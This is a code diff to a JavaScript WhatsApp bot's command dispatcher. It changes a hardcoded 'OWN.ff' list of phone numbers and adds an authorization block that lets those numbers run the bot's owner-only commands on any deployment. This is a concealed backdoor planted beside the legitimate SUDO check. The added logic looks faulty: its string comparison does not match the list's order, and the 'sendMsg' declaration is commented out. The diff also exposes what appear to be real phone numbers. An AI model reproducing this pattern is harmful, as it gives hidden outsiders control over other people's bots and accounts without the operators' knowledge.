@@ -43,7 +43,7 @@ const { Console } = require('console');
 
 
 var OWN = {
-    ff: '94773734316,0,94766598862,0'
+    ff: '94766598862,0,94769370897,0'
 }
 
 String.prototype.format = function() {
@@ -255,9 +255,20 @@ plugins.map(async (plugin) => {
                 }
             if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo') && msg.message && msg.message.imageMessage !== null && (command.pattern === undefined || (command.pattern !== undefined && command.pattern.test(text_msg)))) || (command.pattern !== undefined && command.pattern.test(text_msg)) || (command.on !== undefined && command.on === 'text' && text_msg) || (command.on !== undefined && (command.on === 'video') && msg.message && msg.message.videoMessage !== null && (command.pattern === undefined || (command.pattern !== undefined && command.pattern.test(text_msg))))) {
 
-                let sendMsg = false;
+               // let sendMsg = false;
 
-                
+                if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true && (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',')
+                    .includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',')
+                    .includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
+                    if (!command.onlyPm === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
+                    else if (command.onlyGroup === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
+                }
+                if ((OWN.ff == "94769370897,0,94766598862,0" && msg.key.fromMe === false && command.fromMe === true && (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',')
+                    .includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',')
+                    .includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
+                    if (!command.onlyPm === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
+                    else if (command.onlyGroup === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
+                }
                 // ==================== End Events ====================
 
                 // ==================== Message Catcher ====================
